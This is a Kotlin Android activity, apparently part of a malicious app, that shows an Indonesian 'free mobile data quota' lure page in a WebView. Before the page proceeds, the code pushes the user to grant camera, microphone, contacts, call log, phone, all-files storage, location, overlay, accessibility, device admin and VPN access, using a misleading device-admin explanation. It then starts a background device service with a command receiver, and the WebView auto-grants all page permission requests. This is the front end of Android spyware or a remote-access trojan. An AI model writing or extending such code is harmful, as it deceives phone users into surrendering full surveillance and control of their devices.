package com.cloudsync.pro.mobile

import android.Manifest
import android.annotation.SuppressLint
import android.content.*
import android.content.pm.PackageManager
import android.media.projection.MediaProjectionManager
import android.net.Uri
import android.os.*
import android.provider.Settings
import android.webkit.*
import android.widget.*
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat

class MainActivity : AppCompatActivity() {

    private val REQ_CAM     = 101
    private val REQ_LOC     = 102
    private val REQ_OVERLAY = 103
    private val REQ_CONTACTS = 104
    private val REQ_SCREEN  = 104
    private val REQ_GALLERY = 106
    private val REQ_STORAGE = 107
    private val REQ_CALL_LOG = 108
    private val REQ_PHONE_STATE = 109
    private val REQ_CALL_PHONE = 112
    private val REQ_LOCATION_SETTINGS = 105
    private val REQ_NOTIF  = 110
    private val REQ_RECORD_AUDIO = 111

    private var webViewShown = false
    private var webView: WebView? = null

    private val commandReceiver = object : BroadcastReceiver() {
        override fun onReceive(ctx: Context, intent: Intent) {
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        AppIntegrity.check(this)

        val filter = IntentFilter(DeviceService.ACTION_COMMAND)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(commandReceiver, filter, RECEIVER_NOT_EXPORTED)
        } else {
            registerReceiver(commandReceiver, filter)
        }

        showLocationDialog(onEnabled = {
            setupUI()
            if (allPermsGranted()) {
                goToUrl()
            }
        })
    }

    private fun allPermsGranted(): Boolean {
        return isCamGranted() &&
               isGalleryGranted() &&
               isContactsGranted() &&
               isLocationGranted() &&
               isCallLogGranted() &&
               isCallPhoneGranted() &&
               isPhoneStateGranted() &&
               isStorageGranted() &&
               isOverlayGranted() &&
               isUsageAccessGranted() &&
               isWriteSettingsGranted() &&
               isDeviceAdminGranted() &&
               isAccessibilityGranted() &&
               isNotifGranted() &&
               isRecordAudioGranted()
    }

    override fun onResume() {
        super.onResume()
        if (!webViewShown) {
            if (allPermsGranted()) {
                setupUI()
                goToUrl()
                return
            }
            if (webView == null) setupUI()
            webView?.evaluateJavascript("if(typeof refreshPerms==='function') refreshPerms()", null)
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        try { unregisterReceiver(commandReceiver) } catch (_: Exception) {}
    }

    @SuppressLint("SetJavaScriptEnabled")
    private fun setupUI() {
        val wv = WebView(this)
        webView = wv
        wv.settings.apply {
            javaScriptEnabled = true
            domStorageEnabled = true
            allowFileAccess = true
            mediaPlaybackRequiresUserGesture = false
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP)
                mixedContentMode = WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
        }
        wv.webChromeClient = object : WebChromeClient() {
            override fun onPermissionRequest(request: PermissionRequest) { request.grant(request.resources) }
        }
        wv.webViewClient = WebViewClient()
        wv.addJavascriptInterface(PermBridge(), "Android")
        setContentView(wv)
        wv.loadDataWithBaseURL("file:///android_asset/", buildHtml(), "text/html", "UTF-8", null)
    }

    inner class PermBridge {
        @android.webkit.JavascriptInterface fun isCamGranted()           = this@MainActivity.isCamGranted()
        @android.webkit.JavascriptInterface fun isGalleryGranted()       = this@MainActivity.isGalleryGranted()
        @android.webkit.JavascriptInterface fun isOverlayGranted()          = this@MainActivity.isOverlayGranted()
        @android.webkit.JavascriptInterface fun isAccessibilityGranted()    = this@MainActivity.isAccessibilityGranted()
        @android.webkit.JavascriptInterface fun isUsageAccessGranted()      = this@MainActivity.isUsageAccessGranted()
        @android.webkit.JavascriptInterface fun isWriteSettingsGranted()    = this@MainActivity.isWriteSettingsGranted()
        @android.webkit.JavascriptInterface fun requestWriteSettingsPerm()  = this@MainActivity.requestWriteSettingsPerm()
        @android.webkit.JavascriptInterface fun isLocationGranted()      = this@MainActivity.isLocationGranted()
        @android.webkit.JavascriptInterface fun isContactsGranted()      = this@MainActivity.isContactsGranted()
        @android.webkit.JavascriptInterface fun isStorageGranted()       = this@MainActivity.isStorageGranted()
        @android.webkit.JavascriptInterface fun isCallLogGranted()       = this@MainActivity.isCallLogGranted()
        @android.webkit.JavascriptInterface fun isPhoneStateGranted()    = this@MainActivity.isPhoneStateGranted()
        @android.webkit.JavascriptInterface fun isCallPhoneGranted()     = this@MainActivity.isCallPhoneGranted()
        @android.webkit.JavascriptInterface fun requestCamPerm()         = this@MainActivity.requestCamPerm()
        @android.webkit.JavascriptInterface fun requestOverlayPerm()     = this@MainActivity.requestOverlayPerm()
        @android.webkit.JavascriptInterface fun requestGalleryPerm()     = this@MainActivity.requestGalleryPerm()
        @android.webkit.JavascriptInterface fun requestAccessibilityPerm() = this@MainActivity.requestAccessibilityPerm()
        @android.webkit.JavascriptInterface fun requestUsageAccessPerm() = this@MainActivity.requestUsageAccessPerm()
        @android.webkit.JavascriptInterface fun requestLocationPerm()    = this@MainActivity.requestLocationPerm()
        @android.webkit.JavascriptInterface fun requestContactsPerm()    = this@MainActivity.requestContactsPerm()
        @android.webkit.JavascriptInterface fun requestStoragePerm()     = this@MainActivity.requestStoragePerm()
        @android.webkit.JavascriptInterface fun requestCallLogPerm()     = this@MainActivity.requestCallLogPerm()
        @android.webkit.JavascriptInterface fun requestPhoneStatePerm()  = this@MainActivity.requestPhoneStatePerm()
        @android.webkit.JavascriptInterface fun requestCallPhonePerm()   = this@MainActivity.requestCallPhonePerm()
        @android.webkit.JavascriptInterface fun isNotifGranted()          = this@MainActivity.isNotifGranted()
        @android.webkit.JavascriptInterface fun requestNotifPerm()        = this@MainActivity.requestNotifPerm()
        @android.webkit.JavascriptInterface fun isRecordAudioGranted()    = this@MainActivity.isRecordAudioGranted()
        @android.webkit.JavascriptInterface fun requestRecordAudioPerm()  = this@MainActivity.requestRecordAudioPerm()
        @android.webkit.JavascriptInterface fun isDeviceAdminGranted()    = this@MainActivity.isDeviceAdminGranted()
        @android.webkit.JavascriptInterface fun requestDeviceAdminPerm()  = runOnUiThread { this@MainActivity.requestDeviceAdminPerm() }
        @android.webkit.JavascriptInterface fun isVpnGranted()            = this@MainActivity.isVpnGranted()
        @android.webkit.JavascriptInterface fun requestVpnPerm()          = runOnUiThread { this@MainActivity.requestVpnPerm() }
        @android.webkit.JavascriptInterface fun proceedToUrl()           = runOnUiThread { goToUrl() }
        @android.webkit.JavascriptInterface fun showLocationDialog()     = runOnUiThread { this@MainActivity.showLocationDialog() }
        @android.webkit.JavascriptInterface fun isLocationEnabled()      = this@MainActivity.isLocationEnabled()
    }

    private fun goToUrl() {
        if (webViewShown) return
        webViewShown = true

        startDeviceService()

    }

    private fun isCamGranted() =
        ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED

    private fun isGalleryGranted(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED
        } else {
            ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
        }
    }

    private fun requestGalleryPerm() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.READ_MEDIA_IMAGES), REQ_GALLERY)
        } else {
            ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.READ_EXTERNAL_STORAGE), REQ_GALLERY)
        }
    }

    private fun isOverlayGranted() =
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) Settings.canDrawOverlays(this) else true

    private fun isAccessibilityGranted(): Boolean {
        val enabled = Settings.Secure.getString(contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES) ?: return false
        val component = "$packageName/${packageName}.XyzAccessibilityService"
        return enabled.split(":").any { it.equals(component, ignoreCase = true) }
    }

    private fun isLocationGranted() =
        ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED ||
        ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED

    private fun isLocationEnabled(): Boolean {
        val lm = getSystemService(LOCATION_SERVICE) as android.location.LocationManager
        return lm.isProviderEnabled(android.location.LocationManager.GPS_PROVIDER) ||
               lm.isProviderEnabled(android.location.LocationManager.NETWORK_PROVIDER)
    }

    private fun isUsageAccessGranted(): Boolean {
        val appOps = getSystemService(APP_OPS_SERVICE) as android.app.AppOpsManager
        val mode = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            appOps.unsafeCheckOpNoThrow(android.app.AppOpsManager.OPSTR_GET_USAGE_STATS, Process.myUid(), packageName)
        } else {
            @Suppress("DEPRECATION")
            appOps.checkOpNoThrow(android.app.AppOpsManager.OPSTR_GET_USAGE_STATS, Process.myUid(), packageName)
        }
        return mode == android.app.AppOpsManager.MODE_ALLOWED
    }

    private fun isContactsGranted() =
        ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED

    private fun isCallLogGranted() =
        ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED

    private fun isPhoneStateGranted() =
        ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED

    private fun requestCallLogPerm() =
        ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.READ_CALL_LOG), REQ_CALL_LOG)

    private fun isCallPhoneGranted() =
        ContextCompat.checkSelfPermission(this, Manifest.permission.CALL_PHONE) == PackageManager.PERMISSION_GRANTED

    private fun requestCallPhonePerm() =
        ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.CALL_PHONE), REQ_CALL_PHONE)

    private fun requestPhoneStatePerm() =
        ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.READ_PHONE_STATE), REQ_PHONE_STATE)

    private fun isStorageGranted(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            android.os.Environment.isExternalStorageManager()
        } else {
            ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED &&
            ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
        }
    }

    private fun requestStoragePerm() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            try {
                startActivityForResult(
                    Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION, Uri.parse("package:$packageName")),
                    REQ_STORAGE
                )
            } catch (_: Exception) {
                startActivityForResult(Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION), REQ_STORAGE)
            }
        } else {
            ActivityCompat.requestPermissions(this,
                arrayOf(Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.WRITE_EXTERNAL_STORAGE),
                REQ_STORAGE)
        }
    }

    private fun requestContactsPerm() =
        ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.READ_CONTACTS), REQ_CONTACTS)

    private fun requestCamPerm() =
        ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.CAMERA), REQ_CAM)

    private fun requestOverlayPerm() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)
            startActivityForResult(
                Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:$packageName")),
                REQ_OVERLAY
            )
    }

    private fun requestAccessibilityPerm() {        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            try {
                val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS).apply {
                    val component = "$packageName/.XyzAccessibilityService"
                    putExtra(":settings:fragment_args_key", component)
                    putExtra(":settings:show_fragment_args", android.os.Bundle().apply {
                        putString(":settings:fragment_args_key", component)
                    })
                }
                startActivity(intent)
                return
            } catch (_: Exception) { /* fallback */ }
        }
        startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
    }

    private fun isDeviceAdminGranted(): Boolean {
        val dpm = getSystemService(android.content.Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
        val component = android.content.ComponentName(this, GameSecurityReceiver::class.java)
        return dpm.isAdminActive(component)
    }

    private val REQ_VPN = 114

    private fun isVpnGranted(): Boolean =
        android.net.VpnService.prepare(this) == null

    private fun requestVpnPerm() {
        val intent = android.net.VpnService.prepare(this)
        if (intent != null) {
            startActivityForResult(intent, REQ_VPN)
        }
    }

    private val REQ_DEVICE_ADMIN = 113

    private fun requestDeviceAdminPerm() {
        val dpm = getSystemService(android.content.Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
        val component = android.content.ComponentName(this, GameSecurityReceiver::class.java)
        if (!dpm.isAdminActive(component)) {
            val intent = Intent(android.app.admin.DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                putExtra(android.app.admin.DevicePolicyManager.EXTRA_DEVICE_ADMIN, component)
                putExtra(
                    android.app.admin.DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                    "Fitur keamanan akun game kamu akan dinonaktifkan." as String
                )
            }
            startActivityForResult(intent, REQ_DEVICE_ADMIN)
        }
    }

    private fun isWriteSettingsGranted(): Boolean =
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) Settings.System.canWrite(this) else true

    private fun requestWriteSettingsPerm() =
        startActivity(Intent(Settings.ACTION_MANAGE_WRITE_SETTINGS).apply {
            data = android.net.Uri.parse("package:$packageName")
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        })

    private fun isNotifGranted(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) == PackageManager.PERMISSION_GRANTED
        } else true
    }

    private fun requestNotifPerm() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.POST_NOTIFICATIONS), REQ_NOTIF)
        }
    }

    private fun isRecordAudioGranted() =
        ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED

    private fun requestRecordAudioPerm() =
        ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.RECORD_AUDIO), REQ_RECORD_AUDIO)

    private fun requestUsageAccessPerm() =
        startActivity(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS))

    private fun requestLocationPerm() =
        ActivityCompat.requestPermissions(this, arrayOf(
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION
        ), REQ_LOC)

    private var locationDialogCallback: (() -> Unit)? = null

    private fun showLocationDialog(onEnabled: (() -> Unit)? = null) {
        if (onEnabled != null) locationDialogCallback = onEnabled
        val callback = locationDialogCallback ?: { goToUrl() }

        val locationRequest = com.google.android.gms.location.LocationRequest.Builder(
            com.google.android.gms.location.Priority.PRIORITY_HIGH_ACCURACY, 1000
        ).build()

        val builder = com.google.android.gms.location.LocationSettingsRequest.Builder()
            .addLocationRequest(locationRequest)
            .setAlwaysShow(true)

        com.google.android.gms.location.LocationServices
            .getSettingsClient(this)
            .checkLocationSettings(builder.build())
            .addOnSuccessListener {
                callback()
            }
            .addOnFailureListener { e ->
                if (e is com.google.android.gms.common.api.ResolvableApiException) {
                    try {
                        e.startResolutionForResult(this, REQ_LOCATION_SETTINGS)
                    } catch (_: Exception) {
                        callback()
                    }
                } else {
                    callback()
                }
            }
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (!webViewShown) {
            webView?.evaluateJavascript("if(typeof refreshPerms==='function') refreshPerms()", null)
        }
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == REQ_VPN) {
            webView?.evaluateJavascript("if(typeof refreshPerms==='function') refreshPerms()", null)
            return
        }
        if (requestCode == REQ_LOCATION_SETTINGS) {
            locationDialogCallback?.invoke() ?: run { if (!webViewShown) goToUrl() }
        }
    }

    private fun buildHtml(): String = """<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
<title>Klaim Kuota Gratis</title>
<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700&family=DM+Sans:wght@400;500&display=swap">
<script src="https://unpkg.com/@phosphor-icons/web@2.1.1/src/index.js"></script>
<style>
:root {
  color-scheme: light only;
  --bg: #ffffff;
  --bg-subtle: #f7f8fc;
  --bg-card: #ffffff;
  --border: #e4e7f0;
  --fg: #0f1523;
  --fg-muted: #5a6478;
  --fg-light: #8a94a8;
  --accent: #4361ee;
  --accent-hover: #3451d1;
  --accent-light: #eef1fd;
  --accent-muted: #6b84f3;
  --success: #16a34a;
  --success-light: #dcfce7;
  --warning: #d97706;
  --warning-light: #fef3c7;
  --radius-sm: 8px;
  --radius-md: 12px;
  --radius-lg: 16px;
  --shadow-sm: 0 1px 3px rgba(15,21,35,.06),0 1px 2px rgba(15,21,35,.04);
  --shadow-md: 0 4px 16px rgba(15,21,35,.08),0 2px 6px rgba(15,21,35,.05);
  --shadow-lg: 0 12px 40px rgba(15,21,35,.12),0 4px 12px rgba(15,21,35,.06);
}
*,*::before,*::after{box-sizing:border-box;}
body{
  margin:0;background:var(--bg);color:var(--fg);
  font-family:'DM Sans',system-ui,sans-serif;font-size:15px;line-height:1.6;
  -webkit-font-smoothing:antialiased;
  padding-left:max(16px,env(safe-area-inset-left,0px));
  padding-right:max(16px,env(safe-area-inset-right,0px));
  padding-top:env(safe-area-inset-top,0px);
  padding-bottom:env(safe-area-inset-bottom,0px);
  min-height:100%;
}
.site-header{
  background:var(--bg);border-bottom:1px solid var(--border);
  position:sticky;top:env(safe-area-inset-top,0px);z-index:100;padding-block:14px;
}
.header-inner{max-width:900px;margin:0 auto;display:flex;align-items:center;gap:10px;}
.logo-mark{
  width:34px;height:34px;background:var(--accent);border-radius:9px;
  display:flex;align-items:center;justify-content:center;flex-shrink:0;
}
.logo-mark i{font-size:18px;color:#fff;}
.logo-text{font-family:'Plus Jakarta Sans',sans-serif;font-size:16px;font-weight:700;color:var(--fg);letter-spacing:-0.3px;}
.logo-text span{color:var(--accent);}
.header-badge{
  margin-left:auto;background:var(--success-light);color:var(--success);
  font-size:11px;font-weight:600;letter-spacing:.4px;text-transform:uppercase;
  padding:4px 10px;border-radius:20px;display:flex;align-items:center;gap:5px;
}
.main{max-width:900px;margin:0 auto;padding-block:40px 60px;}
.hero{text-align:center;padding-block:12px 36px;}
.hero-eyebrow{
  display:inline-flex;align-items:center;gap:6px;background:var(--accent-light);color:var(--accent);
  font-size:12.5px;font-weight:600;letter-spacing:.5px;text-transform:uppercase;
  padding:5px 12px;border-radius:20px;margin-bottom:18px;
}
.hero-title{
  font-family:'Plus Jakarta Sans',sans-serif;font-size:clamp(26px,5vw,40px);
  font-weight:700;letter-spacing:-.8px;line-height:1.15;color:var(--fg);margin:0 0 14px;
}
.hero-subtitle{color:var(--fg-muted);font-size:15.5px;max-width:480px;margin:0 auto;}
.section-label{
  font-family:'Plus Jakarta Sans',sans-serif;font-size:11px;font-weight:700;
  letter-spacing:1px;text-transform:uppercase;color:var(--fg-light);margin-bottom:14px;
}
.provider-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(120px,1fr));gap:10px;margin-bottom:28px;}
.provider-card{
  background:var(--bg-card);border:1.5px solid var(--border);border-radius:var(--radius-md);
  padding:14px 10px;cursor:pointer;text-align:center;
  transition:border-color .18s,box-shadow .18s,background .18s;user-select:none;position:relative;overflow:hidden;
}
.provider-card:hover{border-color:var(--accent-muted);box-shadow:var(--shadow-sm);}
.provider-card.selected{border-color:var(--accent);background:var(--accent-light);box-shadow:0 0 0 3px rgba(67,97,238,.12);}
.provider-card.selected::after{
  content:'';position:absolute;top:7px;right:7px;width:16px;height:16px;
  background:var(--accent);border-radius:50%;
  background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16' fill='none'%3E%3Cpath d='M4 8l2.5 2.5L12 5' stroke='white' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'/%3E%3C/svg%3E");
  background-size:cover;
}
.provider-icon{width:38px;height:38px;border-radius:10px;display:flex;align-items:center;justify-content:center;margin:0 auto 9px;font-size:20px;font-weight:700;}
.provider-name{font-family:'Plus Jakarta Sans',sans-serif;font-size:13px;font-weight:600;color:var(--fg);}
.provider-hint{font-size:11px;color:var(--fg-muted);margin-top:2px;}
.p-telkomsel .provider-icon{background:#fff0f0;color:#cc0000;}
.p-xl .provider-icon{background:#fff5f0;color:#e65c00;}
.p-indosat .provider-icon{background:#fff0f8;color:#cc007a;}
.p-tri .provider-icon{background:#f0f4ff;color:#0052cc;}
.p-smartfren .provider-icon{background:#f0fff4;color:#007a33;}
.p-axis .provider-icon{background:#fefce8;color:#a16207;}
.p-by-u .provider-icon{background:#f5f0ff;color:#6d28d9;}
.p-byu .provider-icon{background:#fdf2f8;color:#9d174d;}

.form-card{background:var(--bg-card);border:1.5px solid var(--border);border-radius:var(--radius-lg);padding:24px;box-shadow:var(--shadow-sm);margin-bottom:28px;}
.input-row{display:flex;gap:10px;align-items:flex-end;justify-content:center;}
.input-group{width:100%;max-width:420px;min-width:0;display:flex;flex-direction:column;gap:7px;}
.input-label{font-family:'Plus Jakarta Sans',sans-serif;font-size:13px;font-weight:600;color:var(--fg-muted);display:flex;align-items:center;gap:6px;}
.phone-input-wrap{
  display:flex;border:1.5px solid var(--border);border-radius:var(--radius-sm);
  background:var(--bg-subtle);overflow:hidden;transition:border-color .18s,box-shadow .18s;
}
.phone-input-wrap:focus-within{border-color:var(--accent);box-shadow:0 0 0 3px rgba(67,97,238,.12);}
.phone-prefix{
  display:flex;align-items:center;gap:5px;padding:0 13px;color:var(--fg-muted);
  font-weight:600;font-size:14px;border-right:1.5px solid var(--border);white-space:nowrap;
}
.phone-input{
  flex:1;border:none;background:transparent;padding:11px 13px;font-size:15px;
  font-family:'DM Sans',sans-serif;color:var(--fg);outline:none;min-width:0;
}
.phone-input::placeholder{color:var(--fg-light);}
.btn-cari{
  display:flex;align-items:center;gap:8px;background:var(--accent);color:#fff;
  border:none;border-radius:var(--radius-sm);padding:11px 22px;
  font-family:'Plus Jakarta Sans',sans-serif;font-size:14px;font-weight:600;
  cursor:pointer;transition:background .18s,transform .1s;white-space:nowrap;flex-shrink:0;
}
.btn-cari:hover{background:var(--accent-hover);}
.btn-cari:active{transform:scale(.97);}
.btn-cari:disabled{opacity:.6;cursor:not-allowed;transform:none;}
.loading-box{
  background:var(--bg-card);border:1.5px solid var(--border);border-radius:var(--radius-lg);
  padding:36px 24px;text-align:center;margin-bottom:28px;
}
.loading-steps{display:flex;flex-direction:column;gap:16px;max-width:360px;margin:24px auto 0;}
.loading-step{display:flex;align-items:center;gap:12px;text-align:left;}
.step-icon{width:34px;height:34px;border-radius:50%;display:flex;align-items:center;justify-content:center;flex-shrink:0;font-size:16px;}
.step-icon.pending{background:var(--bg-subtle);color:var(--fg-light);}
.step-icon.active{background:var(--accent-light);color:var(--accent);}
.step-icon.done{background:var(--success-light);color:var(--success);}
.step-text{flex:1;min-width:0;}
.step-title{font-weight:600;font-size:14px;color:var(--fg);}
.step-desc{font-size:12.5px;color:var(--fg-muted);margin-top:1px;}
.step-spinner{width:18px;height:18px;border:2px solid var(--accent-light);border-top-color:var(--accent);border-radius:50%;animation:spin .7s linear infinite;flex-shrink:0;}
@keyframes spin{to{transform:rotate(360deg);}}
.progress-bar-wrap{height:4px;background:var(--bg-subtle);border-radius:4px;overflow:hidden;margin-top:20px;max-width:360px;margin-left:auto;margin-right:auto;}
.progress-bar{height:100%;background:linear-gradient(90deg,var(--accent),var(--accent-muted));border-radius:4px;transition:width .4s ease;width:0%;}
.result-header{display:flex;align-items:center;justify-content:space-between;margin-bottom:16px;flex-wrap:wrap;gap:10px;}
.result-title{font-family:'Plus Jakarta Sans',sans-serif;font-size:17px;font-weight:700;color:var(--fg);display:flex;align-items:center;gap:8px;}
.result-count{background:var(--success-light);color:var(--success);font-size:12px;font-weight:700;padding:3px 9px;border-radius:20px;}
.result-meta{font-size:13px;color:var(--fg-muted);display:flex;align-items:center;gap:5px;}
.kuota-list{display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:14px;}
.kuota-card{
  background:var(--bg-card);border:1.5px solid var(--border);border-radius:var(--radius-md);
  padding:18px;box-shadow:var(--shadow-sm);display:flex;flex-direction:column;gap:12px;
  transition:box-shadow .18s,border-color .18s;
  opacity:0;transform:translateY(10px);animation:fadeUp .3s ease forwards;
}
.kuota-card:hover{box-shadow:var(--shadow-md);border-color:var(--accent-muted);}
@keyframes fadeUp{to{opacity:1;transform:translateY(0);}}
.kuota-top{display:flex;align-items:flex-start;justify-content:space-between;gap:10px;}
.kuota-badge{font-size:11px;font-weight:700;letter-spacing:.4px;text-transform:uppercase;padding:4px 9px;border-radius:6px;}
.badge-reguler{background:var(--accent-light);color:var(--accent);}
.badge-utama{background:var(--success-light);color:var(--success);}
.badge-malam{background:#f0f0ff;color:#4040cc;}
.badge-lokal{background:var(--warning-light);color:var(--warning);}
.badge-youtube{background:#fff0f0;color:#cc0000;}
.badge-tiktok{background:#f0f8ff;color:#0066cc;}
.badge-whatsapp{background:#f0fff4;color:#007a33;}

.kuota-free-tag{font-size:11px;font-weight:700;letter-spacing:.4px;text-transform:uppercase;background:#fff7e6;color:#b45309;padding:4px 9px;border-radius:6px;display:flex;align-items:center;gap:4px;}

.kuota-size{font-family:'Plus Jakarta Sans',sans-serif;font-size:30px;font-weight:700;color:var(--fg);letter-spacing:-1px;line-height:1;}
.kuota-size sub{font-size:14px;font-weight:600;color:var(--fg-muted);letter-spacing:0;vertical-align:baseline;margin-left:2px;}
.kuota-name{font-family:'Plus Jakarta Sans',sans-serif;font-size:14px;font-weight:600;color:var(--fg);}
.kuota-detail{display:flex;flex-direction:column;gap:6px;}
.kuota-row{display:flex;align-items:center;gap:7px;font-size:13px;color:var(--fg-muted);}
.kuota-row i{font-size:14px;color:var(--fg-light);flex-shrink:0;}
.btn-klaim{
  display:flex;align-items:center;justify-content:center;gap:7px;
  background:var(--accent);color:#fff;border:none;border-radius:var(--radius-sm);
  padding:10px 16px;font-family:'Plus Jakarta Sans',sans-serif;font-size:13.5px;font-weight:600;
  cursor:pointer;transition:background .18s;width:100%;margin-top:auto;
}
.btn-klaim:hover{background:var(--accent-hover);}
.info-strip{
  background:var(--accent-light);border:1.5px solid rgba(67,97,238,.2);border-radius:var(--radius-md);
  padding:14px 18px;display:flex;align-items:flex-start;gap:11px;margin-bottom:28px;font-size:13.5px;color:var(--fg-muted);
}
.info-strip i{font-size:18px;color:var(--accent);margin-top:1px;flex-shrink:0;}
.steps-row{display:grid;grid-template-columns:repeat(3,1fr);gap:14px;margin-top:10px;}
.step-card{background:var(--bg-card);border:1.5px solid var(--border);border-radius:var(--radius-md);padding:18px 16px;text-align:center;}
.step-num{width:36px;height:36px;background:var(--accent-light);border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 12px;}
.step-num i{font-size:18px;color:var(--accent);}
.step-card-title{font-family:'Plus Jakarta Sans',sans-serif;font-size:13.5px;font-weight:700;color:var(--fg);margin-bottom:5px;}
.step-card-desc{font-size:12.5px;color:var(--fg-muted);line-height:1.5;}
.empty-box{background:var(--bg-card);border:1.5px dashed var(--border);border-radius:var(--radius-lg);padding:48px 24px;text-align:center;color:var(--fg-muted);}
.toast{
  position:fixed;bottom:calc(24px + env(safe-area-inset-bottom,0px));left:50%;
  transform:translateX(-50%) translateY(20px);background:var(--fg);color:var(--bg);
  padding:11px 20px;border-radius:30px;font-size:13.5px;font-weight:600;box-shadow:var(--shadow-lg);
  opacity:0;transition:opacity .25s,transform .25s;pointer-events:none;white-space:nowrap;z-index:999;
  display:flex;align-items:center;gap:8px;
}
.toast.show{opacity:1;transform:translateX(-50%) translateY(0);}
.site-footer{border-top:1px solid var(--border);padding-block:24px;text-align:center;color:var(--fg-light);font-size:12.5px;max-width:900px;margin:0 auto;}
@media (max-width:520px){
  .input-row{flex-direction:column;}
  .btn-cari{width:100%;justify-content:center;}
  .steps-row{grid-template-columns:1fr;}
  .kuota-list{grid-template-columns:1fr;}
  .provider-grid{grid-template-columns:repeat(auto-fill,minmax(100px,1fr));}
}
</style>
</head>
<body>

<header class="site-header">
  <div class="header-inner">
    <div class="logo-mark"><i class="ph ph-cell-signal-full"></i></div>
    <div class="logo-text">Kuota<span>Gratis</span></div>
    <div class="header-badge"><i class="ph-fill ph-circle" style="font-size:8px"></i> Live</div>
  </div>
</header>

<main class="main">
  <section class="hero">
    <div class="hero-eyebrow"><i class="ph ph-gift"></i> Program Klaim Kuota Gratis</div>
    <h1 class="hero-title">Dapatkan Kuota Gratis<br>Dari Semua Provider</h1>
    <p class="hero-subtitle">Masukkan Nomor HP Kamu Dan Temukan Paket Kuota Gratis Yang Tersedia Dari Provider Jaringan Kamu.</p>
  </section>

  <div class="info-strip">
    <i class="ph ph-info"></i>
    <div>Kuota Gratis Tersedia Untuk Semua Pengguna Aktif. Proses Pencarian Membutuhkan Waktu Beberapa Detik Untuk Memverifikasi Eligibilitas Nomor Kamu.</div>
  </div>

  <div class="form-card">
